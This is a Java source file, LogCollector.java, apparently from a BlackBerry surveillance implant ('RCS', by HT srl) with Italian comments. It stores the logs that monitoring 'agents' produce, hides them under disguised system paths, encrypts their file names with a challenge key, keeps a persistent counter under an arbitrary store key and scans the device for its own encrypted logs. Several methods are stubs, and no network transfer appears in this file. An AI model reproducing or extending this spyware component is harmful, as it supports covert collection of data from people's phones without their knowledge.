/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : LogCollector.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.log;

import java.io.IOException;
import java.util.Date;
import java.util.Enumeration;
import java.util.Vector;

import javax.microedition.io.Connector;
import javax.microedition.io.file.FileConnection;

import net.rim.device.api.system.PersistentObject;
import net.rim.device.api.system.PersistentStore;
import net.rim.device.api.util.NumberUtilities;

import com.ht.rcs.blackberry.agent.Agent;
import com.ht.rcs.blackberry.config.Keys;
import com.ht.rcs.blackberry.crypto.Encryption;
import com.ht.rcs.blackberry.fs.Path;
import com.ht.rcs.blackberry.interfaces.Singleton;
import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class LogCollector implements Singleton {
    public static final String LOG_EXTENSION = ".mob";

    public static final String LOG_DIR = "1";
    public static final String MARKUP_DIR = "2";

    public static final String LOG_DIR_PREFIX = "Z"; // Utilizzato per creare le
    // Log Dir
    public static final String LOG_DIR_FORMAT = "Z*"; // Utilizzato nella
    // ricerca delle Log Dir
    public static final int LOG_PER_DIRECTORY = 500; // Numero massimo di log
    // per ogni directory
    public static final int MAX_LOG_NUM = 25000; // Numero massimo di log che
    // creeremo
    private static final long PERSISTENCE_KEY = 0x6f20a847b93765c8L; // Chiave
    // arbitraria
    // di
    // accesso

    private static Debug debug = new Debug("LogCollector", DebugLevel.VERBOSE);

    static LogCollector instance = null;

    public synchronized static LogCollector getInstance() {
        if (instance == null) {
            instance = new LogCollector();
        }

        return instance;
    }

    private static int GetLogNum() {
        // TODO Auto-generated method stub
        return 0;
    }

    // public boolean storeToMMC;
    Vector logVector;

    private int logProgressive;

    private PersistentObject logProgressivePersistent;

    private LogCollector() {
        super();
        logVector = new Vector();

        logProgressive = deserializeProgressive();
    }

    private void clear() {
        // TODO Auto-generated method stub

    }

    public synchronized boolean CreateLogDir(String dirPath) {
        /*
         * LogNode logNode = new LogNode( dirPath + this.LOG_DIR_PREFIX +
         * MakeDateName(), this.storeToMMC );
         * if(!Path.CreateDirectory(logNode.dirName)) {
         * debug.Error("Cannot create directory: "+logNode.dirName); return
         * false; } logVector.addElement(logNode);
         * debug.trace("Added path element: "+ logNode);
         */

        return true;
    }

    private String decryptName(String logMask) {
        return Encryption.DecryptName(logMask, Keys.getChallengeKey()[0]);
    }

    private synchronized int deserializeProgressive() {
        logProgressivePersistent = PersistentStore
                .getPersistentObject(PERSISTENCE_KEY);
        Object obj = logProgressivePersistent.getContents();

        if (obj == null) {
            debug.info("First time of logProgressivePersistent");
            logProgressivePersistent.setContents(new Integer(1));
        }

        int logProgressive = ((Integer) logProgressivePersistent.getContents())
                .intValue();
        return logProgressive;
    }

    private String encryptName(String logMask) {
        return Encryption.EncryptName(logMask, Keys.getChallengeKey()[0]);
    }

    public Vector getLogs() {
        // TODO Auto-generated method stub
        return null;
    }

    protected synchronized int GetNewProgressive() {
        logProgressive++;
        logProgressivePersistent.setContents(new Integer(logProgressive));

        return logProgressive;
    }

    public synchronized Log LogFactory(Agent agent, boolean onSD) {
        if (GetLogNum() > MAX_LOG_NUM) {
            debug.error("Max log reached");
            return null;
        }

        Log log = new Log(agent, Keys.getAesKey());

        return log;
    }

    /*
     * private String MakeDateDir(Date date, int progressive) { long millis =
     * date.getTime(); long mask = (long) 1E4; int lodate = (int) (millis %
     * mask); int hidate = (int) (millis / mask); Calendar calendar =
     * Calendar.getInstance(); calendar.setTime(date); int year =
     * calendar.get(Calendar.YEAR); int month = calendar.get(Calendar.MONTH);
     * int day = calendar.get(Calendar.DAY_OF_MONTH); int hour =
     * calendar.get(Calendar.HOUR); int minute = calendar.get(Calendar.MINUTE);
     * int second = calendar.get(Calendar.SECOND); String newname =
     * NumberUtilities.toString(millis, 16, 6);
     * //NumberUtilities.toString(lodate, 16, 8)+
     * //NumberUtilities.toString(hidate, 16, 8); return newname; }
     */

    private String MakeDateName(Date date) {
        long millis = date.getTime();
        long mask = (long) 1E4;
        int lodate = (int) (millis % mask);
        int hidate = (int) (millis / mask);

        String newname = NumberUtilities.toString(lodate, 16, 8)
                + NumberUtilities.toString(hidate, 16, 8);

        return newname;
    }

    public void makeLogDirs(boolean storeToMMC) {
        if (storeToMMC) {
            CreateLogDir(Path.SDPath);
            CreateLogDir(Path.SDPath + LOG_DIR);
        } else {
            CreateLogDir(Path.UserPath);
            CreateLogDir(Path.UserPath + LOG_DIR);
        }
    }

    public synchronized Vector MakeNewName(Log log, Agent agent) {

        boolean onSD = agent.onSD();
        Date timestamp = log.timestamp;
        int progressive = GetNewProgressive();

        Vector vector = new Vector();

        // log.SetProgressive(progressive);

        String basePath = onSD ? Path.SDPath : Path.UserPath;

        String blockDir = "_" + (progressive / LOG_PER_DIRECTORY);
        String fileName = this.MakeDateName(timestamp);

        String encName = Encryption.EncryptName(fileName + LOG_EXTENSION, Keys
                .getChallengeKey()[0]);

        vector.addElement(new Integer(progressive));
        vector.addElement(basePath + LOG_DIR); // file:///SDCard/BlackBerry/system/$RIM313/$1
        vector.addElement(blockDir); // 1
        vector.addElement(encName); // ?
        return vector;
    }

    /**
     * Rimuove i file uploadati e le directory dei log dal sistema e dalla MMC.
     */

    public synchronized void removeLogDirs() {

    }

    // eventualmente progressivo

    private boolean scanForLogs(String currentPath) {
        Check.requires(currentPath != null, "null argument");

        FileConnection fc;

        try {
            fc = (FileConnection) Connector.open(currentPath);

            if (fc.isDirectory()) {
                Enumeration fileLogs = fc.list("*", true);

                while (fileLogs.hasMoreElements()) {
                    String file = (String) fileLogs.nextElement();
                    return scanForLogs(file);
                }
            } else {
                // e' un file, vediamo se e' un file nostro
                String logMask = LogCollector.LOG_EXTENSION;
                String encLogMask = encryptName(logMask);

                if (currentPath.endsWith(encLogMask)) {
                    String encName = fc.getName();
                    debug.trace("enc name: " + encName);
                    String plainName = decryptName(encName);
                    debug.trace("plain name: " + plainName);

                }
            }

        } catch (IOException e) {
            e.printStackTrace();
            return false;
        }

        return true;
    }

    //
    public void ScanLogs() {
        clear();

        // cerca i log sul filesystem, scandendo tutti i possibili path
        // usando come filtro LOG_DIR_FORMAT

        scanForLogs(Path.SDPath);
        scanForLogs(Path.UserPath);

        // costruisce le directory secondo storeToMMC
        makeLogDirs(true);
        makeLogDirs(false);
    }
}
